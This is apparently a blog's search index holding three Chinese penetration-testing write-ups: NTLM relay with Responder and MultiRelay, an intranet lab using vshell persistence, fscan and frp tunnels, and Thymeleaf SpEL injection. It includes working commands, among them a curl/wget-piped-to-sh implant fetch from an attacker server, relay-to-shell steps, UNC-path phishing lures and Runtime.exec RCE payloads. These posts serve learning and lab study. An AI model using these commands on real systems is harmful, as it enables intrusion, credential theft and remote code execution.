<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NTLM-Relay攻击</title>
      <link href="/2024/04/09/NTLM-Relay%E6%94%BB%E5%87%BB/"/>
      <url>/2024/04/09/NTLM-Relay%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>也叫 <code>NTLM</code> 重放攻击，<code>NTLM</code> 中继攻击。</p><h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>这里要先了解 <strong>Windows系统名称解析顺序</strong>  。<br>当我们访问一个共享时 <code>net use \aaa</code> ，其寻找这个主机名称会遵循以下的步骤：</p><ol><li>本地 <code>hosts</code> 文件（ <code>%windir%\System32\drivers\etc\hosts</code> ）</li><li><code>DNS</code> 缓存&#x2F; <code>DNS</code> 服务器</li><li>链路本地多播名称解析（ <code>LLMNR</code> ）和 <code>NetBIOS</code> 名称服务（ <code>NBT-NS</code> ）</li></ol><p>如果没有在1、2项中找到对应名称，系统就会通过链路本地多播名称解析（ <code>LLMNR</code> ）和 <code>Net-BIOS</code> 名称服务（ <code>NBT-NS</code> ）在本地进行名称解析。这时，客户端就会将未经认证的 <code>UDP</code> 广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是这台机器。</p><p>因此当用户输入不存在、包含错误或者 <code>DNS</code> 中没有的主机名时，通过 <code>Responder</code> 工具（ <code>kali</code> 自带）监听 <code>LLMNR</code> 和 <code>NetBIOS</code> 广播，就可以伪装成受害者要访问的这台机器，并从而让受害者交出相应的登陆凭证。核心过程与 <code>arp</code> 欺骗类似，我们可以让攻击者作中间人，截获到客户端的 <code>Net-NTLM Hash</code> 。</p><blockquote><p>注意 <code>Net-NTLM Hash</code> 和 <code>NTLM Hash</code> 加密的规则不一样，因此不能用 <code>Net-NTLM Hash</code> 去使用哈希传递攻击，但是它们原文中都包含用户的登录密码，因此被破解后都可以得到受害者的登录密码。</p></blockquote><h1 id="攻击前提"><a href="#攻击前提" class="headerlink" title="攻击前提"></a>攻击前提</h1><p>如果被攻击主机开启了 <code>SMB</code> 签名，被攻击主机就会验证攻击机的身份，因此就无法使用这个攻击，不过域内用户是默认关闭 <code>SMB</code> 签名的，域控是默认开启 <code>SMB</code> 签名的。</p><h1 id="攻击实验"><a href="#攻击实验" class="headerlink" title="攻击实验"></a>攻击实验</h1><p>先要准备 <code>Responder</code> 工具。</p><p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p><p>这个工具中在 <code>kali</code> 中也有，在 <code>/usr/share/responder</code> 目录。不过重新下载，使用新版的会更好。</p><h2 id="方式一：破解Net-NTLM-Hash"><a href="#方式一：破解Net-NTLM-Hash" class="headerlink" title="方式一：破解Net-NTLM Hash"></a>方式一：破解Net-NTLM Hash</h2><p>使用 <code>Responder</code> 工具监听被攻击机所在网络的广播信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I eth0</span><br></pre></td></tr></table></figure><p>之后在被攻击机上模拟发起 <code>NTLM</code> 请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\aaaa\bbb</span><br></pre></td></tr></table></figure><p><code>responder</code> 就会截获被攻击机的数据包，然后伪装自己是被攻击机要访问的机器，从而索取被攻击机的 <code>Net-NTLM Hash</code> 。</p><p><img src="/imgs/Pasted%20image%2020240406235440.png"></p><p>然后执行下面的操作破解 <code>Hash</code> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将历史捕捉到的Hash都再次Dump出来，然后存到DumpNTLMv1.txt和DumpNTLMv2.txt</span><br><span class="line">python DumpHash.py</span><br><span class="line"># 使用john命令来破解Net-NTLM Hash</span><br><span class="line">john DumpNTLMv2.txt</span><br></pre></td></tr></table></figure><h2 id="方式二：重放Net-NTLM-Hash"><a href="#方式二：重放Net-NTLM-Hash" class="headerlink" title="方式二：重放Net-NTLM Hash"></a>方式二：重放Net-NTLM Hash</h2><p>上面的方式一需要暴力破解 <code>Hash</code> ，难度往往较大，这里可以考虑使用重放攻击。</p><h3 id="重放到SMB利用"><a href="#重放到SMB利用" class="headerlink" title="重放到SMB利用"></a>重放到SMB利用</h3><p> <code>NTLM</code> 重放到 <code>SMB</code> 利用需要被攻击主机关闭 <code>SMB</code> 签名，因此我们先通过 <code>Responder</code> 工具的 <code>tools</code> 目录里的 <code>RunFinger.py</code> 工具来看一下某个网段的主机是否开启了 <code>SMB</code> 签名（对应下图中的 <code>Signing</code> 字段）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RunFinger.py -i 192.168.163.0/24</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240406233705.png"></p><blockquote><p>这里需要重放的 <code>Net-NTLM Hash</code> 是 <code>administrator</code> 的才行，不然别的机器也不会让你访问。</p></blockquote><p>先修改 <code>Responder.conf</code> ，将其中的 <code>SMB</code> 和 <code>HTTP</code> 修改为 <code>Off</code> 。</p><p><img src="/imgs/Pasted%20image%2020240407014929.png"></p><p>然后在两个不同的终端分别执行下面两个命令。 <code>MultiRelay.py</code> 在 <code>tools</code> 目录下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I eth0</span><br><span class="line">python MultiRelay.py -t 192.168.163.140 -u ALL</span><br></pre></td></tr></table></figure><p>然后在某个主机用管理员权限执行 <code>net use \\aaa\bb</code> ，攻击机 <code>kali</code> 就会截获其 <code>Net-NTLM Hash</code> ，然后 <code>MultiRelay.py</code> 就会将其重放给 <code>192.168.163.140</code> 这个机器，如果成功了在运行 <code>MultiRelay.py</code> 的终端就会得到 <code>140</code> 这台机器的 <code>shell</code> ，从而拿下 <code>140</code> 这台主机。</p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>类似地，使用 <code>NTLM</code> 认证的服务有很多，我们还可以重放 <code>Net-NTLM</code> 到 <code>Exchange</code> ，<code>LDAP</code> ，<code>AD CS</code> 来利用，这里就不细说了。最常用的还是重放到 <code>SMB</code> 。</p><h1 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h1><p>上面的攻击最关键的前提是域内有主机发起了 <code>NTLM</code> 请求，所以在实战中通过钓鱼诱导域内人员发起 <code>NTLM</code> 请求很关键。在 <code>Windows</code> 中，通过设置指向恶意服务器的 <code>UNC</code> 路径，能够使受害机使用当前用户凭证向恶意服务器发起 <code>NTLM</code> 认证。这里概括介绍几种常用的诱导方法。</p><ol><li>执行会发起 <code>NTLM</code> 请求的命令。（不过可能性比较小）</li><li>利用 <code>desktop.ini</code> 文件，修改其 <code>IconResource</code> 属性（文件夹的图标路径）为指向恶意服务器的 <code>UNC</code> 路径，从而域内用户一访问此文件夹就会自动发起 <code>NTLM</code> 请求。类似的还有 <code>SCF</code> 文件，<code>PDF</code> 文件，<code>Office</code> 文档。</li><li>利用 <code>XSS</code> 漏洞发起 <code>NTLM</code> 请求。</li><li>利用 <code>SQL</code> 注入发起 <code>NTLM</code>  请求。</li></ol><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/12627">https://xz.aliyun.com/t/12627</a><br><a href="https://www.freebuf.com/articles/system/194549.html">https://www.freebuf.com/articles/system/194549.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入门内网渗透实验一</title>
      <link href="/2024/04/01/%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
      <url>/2024/04/01/%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h1><p>熟悉内网渗透的基本流程，熟悉内网渗透时一些基本工具的实验，这个实验基于 <code>Linux</code> 。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://github.com/justdoit-cai/LAN-penetration-exp/tree/main/LAN-penetration-exp1">https://github.com/justdoit-cai/LAN-penetration-exp/tree/main/LAN-penetration-exp1</a></p><h1 id="获取暴露在外网的靶机的权限"><a href="#获取暴露在外网的靶机的权限" class="headerlink" title="获取暴露在外网的靶机的权限"></a>获取暴露在外网的靶机的权限</h1><p>首先内网渗透的第一步肯定是要先利用外网程序的漏洞来反弹 <code>shell</code> 到自己公网的 <code>vps</code> 上，获取一台外网机器的权限。</p><p><img src="/imgs/Pasted%20image%2020240401015613.png"></p><p><img src="/imgs/Pasted%20image%2020240401015631.png"></p><h1 id="持久化webshell"><a href="#持久化webshell" class="headerlink" title="持久化webshell"></a>持久化webshell</h1><p>一方面为了 <code>webshell</code> 的稳定性，另一方面为了避免程序的漏洞被修复导致我们无法再利用程序的漏洞获取外网靶机的 <code>webshell</code> ，我们需要上传后门到靶机上来持久化 <code>webshell</code> 。</p><p>这里主要介绍几种持久化 <code>webshell</code> 的工具。</p><h2 id="vshell"><a href="#vshell" class="headerlink" title="vshell"></a>vshell</h2><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://github.com/veo/vshell">https://github.com/veo/vshell</a></p><p>不过不幸的是，这个工具现在被封禁了，停止了更新并且也不给用了。</p><p><img src="/imgs/Pasted%20image%2020240401020855.png"></p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>下载程序到自己的 <code>vps</code> 上，自己的 <code>vps</code> 要开放 <code>8082</code> （管理端口）和 <code>8084</code> （上线靶机端口）端口，然后直接启动程序即可。</p><p><img src="/imgs/Pasted%20image%2020240401021042.png"></p><p>这里管理页面的默认账号密码是 <code>admin/qwe123qwe</code> 。</p><p>这里我们复制 <strong>客户端生成</strong> 页面的上线命令通过反弹 <code>shell</code> 在受控的靶机上执行，然后过一会就可以获取持久化的 <code>shell</code> 了。</p><p><img src="/imgs/Pasted%20image%2020240401022722.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL -m180 &lt;服务端地址&gt;:8084/slt||wget -T180 -q &lt;服务端地址&gt;:8084/slt)|sh</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240401022500.png"></p><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><h3 id="下载地址-1"><a href="#下载地址-1" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>在靶机执行下面的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/shadow1ng/fscan/releases/download/1.8.3/fscan</span><br><span class="line">chmod a+x fscan</span><br><span class="line"># 获取受控靶机的内网ip</span><br><span class="line">ifconfig</span><br><span class="line">./fscan -h &lt;内网ip地址网段&gt;</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240401024705.png"></p><p>这里发现了 <code>172.18.0.2</code> 这台另外的内网主机，并且开放了 <code>8080</code> 端口。</p><p><img src="/imgs/Pasted%20image%2020240401024721.png"></p><h1 id="挂代理进内网"><a href="#挂代理进内网" class="headerlink" title="挂代理进内网"></a>挂代理进内网</h1><h2 id="vshell工具"><a href="#vshell工具" class="headerlink" title="vshell工具"></a>vshell工具</h2><p>前面用到过的 <code>vshell</code> 自身就支持一键开启代理，而且这个的操作很方便，因为 <code>vshell</code> 会自动帮我们搞好到靶机的代理，不需要我们自己手动操作靶机。</p><p><img src="/imgs/Pasted%20image%2020240401025727.png"></p><h2 id="隧道代理的使用方式"><a href="#隧道代理的使用方式" class="headerlink" title="隧道代理的使用方式"></a>隧道代理的使用方式</h2><p>这里在介绍下面一种代理工具前，我们先来学习一下怎么使用我们搭建好的 <strong>隧道代理</strong> ，这里以 <code>Socks5</code> 隧道代理为例。</p><h3 id="proxychains工具"><a href="#proxychains工具" class="headerlink" title="proxychains工具"></a>proxychains工具</h3><p><code>proxychains &lt;待执行的命令&gt;</code> 命令可以指定某个待执行的命令在发起网络请求的时候使用我们 <code>proxychains</code> 使用的代理。这样我们在本地的 <code>kali</code> 对目标内网发起脚本程序攻击时，脚本程序可以连接的到目标内网。</p><p><code>proxychains</code> 的配置文件在为 <code>/etc/proxychains.conf</code> 或者 <code>/etc/proxychains4.conf</code> 。我们配置代理只需要在这个文件的底部如下配置就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 代理如果没有验证就可以不需要后面两个配置</span><br><span class="line">&lt;代理方式&gt;  &lt;代理ip&gt;  &lt;代理port&gt;  &lt;代理验证的用户名&gt;  &lt;代理验证的密码&gt;</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240401035729.png"></p><p><code>proxychains</code> 的使用方法如下：</p><p>我们可以发现 <code>curl</code> 命令带了 <code>proxychains</code> 走代理就可以成功访问目标内网。</p><p><img src="/imgs/Pasted%20image%2020240401035933.png"></p><p>并且我们在 <code>kali</code> 中还可以使用 <code>proxychains</code> 来运行浏览器，这里在渗透内网的网站时就会更方便。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用代理运行firefox，这样就可以访问内网的页面了</span><br><span class="line">proxychains firefox</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240401040258.png"></p><h2 id="frp工具"><a href="#frp工具" class="headerlink" title="frp工具"></a>frp工具</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><code>frp</code> 是一个高性能的反向代理应用，支持 <code>tcp</code>, <code>udp</code>, <code>http</code>, <code>https</code> 协议。</p><ul><li>利用处于防火墙后的机器，对外网环境提供 <code>http</code> 或 <code>https</code> 服务。</li><li>对于 <code>http</code> , <code>https</code> 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个 <code>80</code> 端口。</li><li>利用处于防火墙后的机器，对外网环境提供 <code>tcp</code> 和 <code>udp</code> 服务，例如在家里通过 <code>ssh</code> 访问处于公司局部环境的主机。</li></ul><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li>服务端运行，监听一个主端口，等待客户端的连接；</li><li>客户端连接到服务端的主端口，同时告诉服务端要监听的端口和转发类型；</li><li>服务端 <code>fork</code> 新的进程监听客户端指定的端口；</li><li>外网用户连接到客户端指定的端口，服务端通过和客户端的连接将数据转发到客户端；</li><li>客户端进程再将数据转发到本地服务，从而实现内网对外暴露服务的能力。</li></ol><h3 id="下载地址-2"><a href="#下载地址-2" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><h3 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h3><blockquote><p>老版本的 <code>frp</code> 使用的是 <code>ini</code> 配置文件，新版本的 <code>frp</code> 默认使用的是 <code>toml</code> 配置文件。最新版的配置文件格式参考： <a href="https://dusays.com/636/">https://dusays.com/636/</a></p></blockquote><p>在自己的公网服务器上执行下面的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.56.0/frp_0.56.0_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.56.0_linux_amd64.tar.gz</span><br><span class="line">./frps -c frps.toml</span><br></pre></td></tr></table></figure><p>下面两种方式的 <code>frps.toml</code> 的文件内容都如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindPort = 10002</span><br></pre></td></tr></table></figure><p>在靶机上执行上面相似的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.56.0/frp_0.56.0_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.56.0_linux_amd64.tar.gz</span><br><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure><h4 id="方法一：传统代理配置"><a href="#方法一：传统代理配置" class="headerlink" title="方法一：传统代理配置"></a>方法一：传统代理配置</h4><p><code>frpc.toml</code> 的文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;43.139.58.138&quot;</span><br><span class="line">serverPort = 10002</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;test&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">localIP = &quot;172.18.0.2&quot;</span><br><span class="line">localPort = 8080</span><br><span class="line">remotePort = 10001</span><br></pre></td></tr></table></figure><blockquote><p>其中 <code>server</code> 端的 <code>bindPort</code> 对应 <code>client</code> 端的 <code>serverPort</code> ，注意这个端口是它们两个的数据通信端口，而非我们访问的端口。上面的文件内容表示我们对公网 <code>43.139.58.138:10001</code> 地址发过去的 <code>tcp</code> 数据会被转发到内网的 <code>172.18.0.2:8080</code> 处。</p></blockquote><p>注意这里在访问内网的时候需要通过公网的 <code>ip</code> 地址来访问。</p><p><img src="/imgs/Pasted%20image%2020240401044723.png"></p><h4 id="方法二：socks5隧道代理配置"><a href="#方法二：socks5隧道代理配置" class="headerlink" title="方法二：socks5隧道代理配置"></a>方法二：socks5隧道代理配置</h4><p>按照 <code>frp</code> 本身的工作原理是使用的传统代理配置，但是 <code>frp</code> 也提供了插件来搭建隧道代理，使用方式如下。</p><p><code>frpc.toml</code> 的文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;43.139.58.138&quot;</span><br><span class="line">serverPort = 10002</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;plugin_socks5&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">remotePort = 10001</span><br><span class="line">[proxies.plugin]</span><br><span class="line">type = &quot;socks5&quot;</span><br><span class="line">username = &quot;anchor&quot;</span><br><span class="line">password = &quot;justdoit123&quot;</span><br></pre></td></tr></table></figure><p>然后启动两端后使用的方式和前面的 <code>vshell</code> 代理一样，使用内网 <code>ip</code> 地址来访问。</p><h2 id="传统代理和隧道代理的区别"><a href="#传统代理和隧道代理的区别" class="headerlink" title="传统代理和隧道代理的区别"></a>传统代理和隧道代理的区别</h2><p>隧道代理（ <code>Tunnel Proxy</code> ）是一种特殊的代理服务，它允许用户通过固定的本地 <code>IP</code> 和端口访问互联网。在这个过程中，云端服务器负责 <strong>自动切换</strong>  <code>IP</code> 地址，从而实现 <strong>匿名访问</strong> 。通过隧道代理，用户可以绕过网络审查，保护网络通讯安全，以及隐藏用户身份。</p><p>隧道代理的工作原理相对简单。当您通过隧道代理访问互联网时，本地计算机将请求发送到代理服务器。代理服务器接收到请求后，会使用其 <strong>自身的 <code>IP</code> 地址与目标服务器建立连接</strong> 。在数据传输过程中，代理服务器会自动更换 <code>IP</code> 地址，确保用户的真实 <code>IP</code> 地址不被泄露。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thymeleaf漏洞汇总</title>
      <link href="/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"/>
      <url>/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="Thymeleaf和SpringBoot的对应版本"><a href="#Thymeleaf和SpringBoot的对应版本" class="headerlink" title="Thymeleaf和SpringBoot的对应版本"></a>Thymeleaf和SpringBoot的对应版本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SpringBoot     Thymeleaf</span><br><span class="line">2.2.0.RELEASE  3.0.11</span><br><span class="line">2.4.10         3.0.12</span><br><span class="line">2.7.18         3.0.15</span><br><span class="line">3.0.8          3.1.1</span><br><span class="line">3.2.2          3.1.2</span><br></pre></td></tr></table></figure><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><code>Thymeleaf</code> 主要存在两种类型的漏洞，一种是出于开发者的失误，让用户可以任意指定视图名导致触发 <code>Thymeleaf 3.x</code> 中的片段表达式解析 <code>RCE</code> 。一种是在解析 <code>Thymeleaf</code> 模板时，其中模板内容被用户可控，导致模板中被用户注入恶意的表达式。</p><blockquote><p>第一种漏洞是 <code>Thymeleaf</code> 的特性，主要是由于控制器在返回视图名时，如果视图名包含片段表达式，就会对其进行预处理，其中会进行 <code>SpEL</code> 表达式的解析，从而造成命令执行。但是官方不承认这是一个框架的漏洞，因为官方认为程序返回的视图名不应该被用户完全控制，这种漏洞是出于开发者的失误。<br>第二种漏洞就是我们常见的 <code>SSTI</code> 类型的漏洞，主要的攻击和防护方法围绕在沙箱逃逸和沙箱加固中，</p></blockquote><p>下面依次来分析这两种漏洞。</p><h1 id="漏洞一：控制视图名"><a href="#漏洞一：控制视图名" class="headerlink" title="漏洞一：控制视图名"></a>漏洞一：控制视图名</h1><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/demo1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">demo1</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(data);</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/demo2/&#123;data&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">demo2</span><span class="params">(<span class="meta">@PathVariable</span> String data)</span> &#123;</span><br><span class="line">        System.out.println(data);</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码模拟了开发者让用户动态指定返回的模板的两种情景，两种情景本质都是一样的。</p><h2 id="3-0-11版本及之前"><a href="#3-0-11版本及之前" class="headerlink" title="3.0.11版本及之前"></a>3.0.11版本及之前</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>在 <code>Thymeleaf 3.x</code> 提供了一个新的表达式： <strong>片段表达式</strong> （形如： <code>~&#123;...&#125;</code>），用于复用前端页面的元素。并且可以用于前面测试代码中的 <code>data</code> 参数中。更加关键的是，在 <code>Thymeleaf</code> 底层解析片段表达式的时候，会对片段表达式中的预处理表达式（形如 <code>__...__</code> ）进行处理，而预处理表达式中是可以通过 <code>SpEL</code> 表达式执行命令的，从而造成命令执行。</p><p>这样就说明只有 <code>3.x</code> 版本的 <code>Thymeleaf</code> 才会受影响。因为 <code>2.x</code> 中只会单纯的根据 <code>data</code> 的值找对应的模板，不会做片段表达式中的预处理。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在 <code>Thymeleaf</code> 解析返回的模板时，必经的方法是 <code>ThymeleafView#renderFragment()</code> 。这个方法的 <code>viewTemplateName</code> 对应测试代码中 <code>controller</code> 返回的 <code>data</code> 参数。如果 <code>data</code> 参数中包含了 <code>::</code> ，<code>Thymeleaf</code> 就会把这个参数当作片段表达式处理。</p><p><img src="/imgs/Pasted%20image%2020240319230230.png"></p><p>然后在几个方法调用后，来到 <code>StandardExpressionPreprocessor#preprocess()</code> 中进行预处理表达式的处理。</p><p><img src="/imgs/Pasted%20image%2020240319230946.png"></p><p>这个方法中会通过正则表达式提取 <code>__...__</code> 中的内容，然后交给 <code>expression.execute()</code> 处理，最终当作 <code>Spel</code> 表达式来处理造成命令执行。</p><p>根据上面的分析，我们可以构造出下面的 <code>POC</code> （形如 <code>__SpEL表达式__::</code>）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/demo1?data=__$%7BT(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br><span class="line">/demo2/__$%7BT(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br></pre></td></tr></table></figure><h2 id="3-0-12版本"><a href="#3-0-12版本" class="headerlink" title="3.0.12版本"></a>3.0.12版本</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>针对 <code>Thymeleaf 3.0.11</code> 中的问题，在 <code>3.0.12</code> 版本中， <code>Thymeleaf</code> 在 <code>util</code> 目录下增加了 <code>SpringRequestUtils</code> 和 <code>SpringStandardExpressionUtils</code> 两个类。</p><p>根据文件中的注释说明我们就可以知道，<code>SpringStandardExpressionUtils</code> 是用来避免 <code>SpEL</code> 表达式创建对象和调用类的静态方法。</p><p><a href="https://github.com/thymeleaf/thymeleaf/compare/thymeleaf-spring5-3.0.11.RELEASE...thymeleaf-spring5-3.0.12.RELEASE?diff=unified&w=">https://github.com/thymeleaf/thymeleaf/compare/thymeleaf-spring5-3.0.11.RELEASE...thymeleaf-spring5-3.0.12.RELEASE?diff=unified&amp;w=</a></p><p><img src="/imgs/Pasted%20image%2020240319195045.png"></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>在 <code>3.0.12</code> 版本中，<code>renderFragment()</code> 中多了一个对 <code>viewTemplateName</code> 进行判断的方法。</p><p><img src="/imgs/Pasted%20image%2020240319195430.png"></p><p><code>StringUtils.pack()</code> 的作用是去掉字符串的空格和 <code>ASCII</code> 码在空格之前的特殊字符，并最后转为小写。然后就是先看 <code>uri</code> 中是否存在 <code>viewName</code> （这一步是为了检查 <code>restful</code> 风格的参数是否包含了 <code>viewName</code> ），然后遍历 <code>url</code> 中的参数（ <code>?key=value</code> 的部分 ）是否包含了 <code>viewName</code> （这一步检查的是普通的参数），如果上述任意其一包含了 <code>vn</code> 就报错。正对应这个方法名，检查 <code>viewName</code> 是否在 <code>request</code> 对象中。</p><p><img src="/imgs/Pasted%20image%2020240319195723.png"></p><p>这样子即使开发者误开发了视图名称可以由用户控制的代码情景，<code>Thymeleaf</code> 底层也不会将视图名称作为片段表达式执行。</p><p><img src="/imgs/Pasted%20image%2020240319233416.png"></p><blockquote><p>此时，我们测试代码中的两个 <code>controller</code> 情景就都被防护了。但是如果 <code>controller</code> 